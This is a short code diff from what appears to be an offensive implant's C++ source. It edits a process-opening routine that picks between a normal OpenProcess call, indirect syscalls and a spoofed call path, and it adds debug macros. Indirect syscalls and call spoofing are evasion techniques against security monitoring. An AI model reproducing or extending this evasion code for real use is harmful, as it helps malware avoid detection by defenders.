@@ -5,14 +5,15 @@ auto DECLFN Process::Open(
     _In_ BOOL  InheritHandle,
     _In_ ULONG ProcessID
 ) -> HANDLE {
-    const UINT32 Flags    = SYSCALL_FLAGS;
+    const UINT32 Flags    = Self->KH_SYSCALL_FLAGS;
     NTSTATUS     Status   = STATUS_UNSUCCESSFUL;
     HANDLE       Handle   = nullptr;
     CLIENT_ID    ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
     OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr) };
 
     if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
-        return Self->Krnl32.OpenProcess(RightsAccess, InheritHandle, ProcessID);
+        KH_DBG_MSG
+        return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
     }
 
     UPTR Address = ( Flags & SYSCALL_INDIRECT )
@@ -24,8 +25,10 @@ auto DECLFN Process::Open(
         : 0;
 
     if ( Flags & SYSCALL_INDIRECT && ! ( Flags & SYSCALL_SPOOF ) ) {
+        KH_DBG_MSG
         SyscallExec(Sys::OpenProc, Status, &Handle, RightsAccess, &ObjAttr, &ClientID);
     } else {
+        KH_DBG_MSG
         Status = Self->Spf->Call(
             Address, ssn, (UPTR)&Handle, (UPTR)RightsAccess,
             (UPTR)&ObjAttr, (UPTR)&ClientID
